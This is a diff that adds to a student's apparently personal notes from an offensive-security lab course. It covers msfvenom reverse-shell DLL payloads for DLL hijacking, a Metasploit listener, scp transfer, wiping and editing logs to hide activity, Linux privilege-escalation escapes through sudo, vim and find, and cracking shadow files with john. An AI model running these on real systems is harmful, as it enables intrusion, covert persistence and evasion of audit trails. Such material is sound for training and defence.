@@ -502,4 +502,59 @@ DAY ???
                - when gui isnt available, be careful with /v, output is OBTUSE
                wmic service list full
                - same idea, be careful with full. output scary either way
-      
+            
+           msfvenom --list - proabably useless to me
+           tcp LHOST=10.50.23.117 LPORT=4444 -f dll > SSPICLI.dll
+[REDACTED] scp SSPICLI.dll DemoAdmin@10.50.27.25:C:\\User\\DemoAdmin\\ *** gunny couldnt teach it so i cant do it
+           use exploit/multi/handler
+            payload /shell_reverse_tcp
+            lhost 0.0.0.0/linops 
+            lport 4444
+           msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+           
+       scp - tcp port 22
+       download remote to local
+       scp student@xxx.xxx.xxx.xxx:secrets.txt /home/student
+       upload remote to local
+       scp secrets.txt student@xxx.xxx.xxx.xxx:/home/student
+       copy from remote to remote
+       scp -3 student@xxx.xxx.xxx.2:/home/student/secrets.txt student@xxx.xxx.xxx.1:/home/student
+       
+       sudo -l
+DAY ???     
+       CLEANING THE LOGS:
+         Basic:
+         Just get rid of it:
+         - rm -rf (/path/file)
+         Blank it:
+         - cat /dev/null > (/path/file)
+         - echo > /var/log/btmp
+         Precision:
+         - Always work off a backup
+         - Egrep -v ‘192.168.0.1’ auth.log > auth.log - Removing lines with a specific ip in them
+            - egrep -v 'x.x.x.x' auth.;pg > auth.log2; cat auth.log2 > auth.log; rm auth.log2 
+         RSYSLOG
+         - Newer Rsyslog call /etc/rsyslog.d/* for settings/rules
+         - Older uses /etc/rsyslog.conf
+            grep "InculdeConfig" /etc/rsyslog.conf
+
+      LINUX PRIV ESC
+         https://gtfobins.github.io/
+            sudo apt-get changelog apt
+               !/bin/sh
+         Find files based on permissions:
+          - find /* -type f -perm /2000 -ls 2>/dev/null - SGID
+          - find /* -type f -perm /4000 -ls 2>/dev/null - SUID
+          - find /* -type f -perm /6000 -ls 2>/dev/null - SGID + SUID
+          - sudo find . -exec /bin/bash \; -quit  
+           
+          sudo vim 
+          root/file.txt
+          :!/bin/bash
+          root@lin:~#
+          
+          john --wordlist=rockyou.txt shadow.txt --show 
+                          ^ reconnaissance will show you what wordlist you need to use for john in order to pass le test
+           
+           
+           
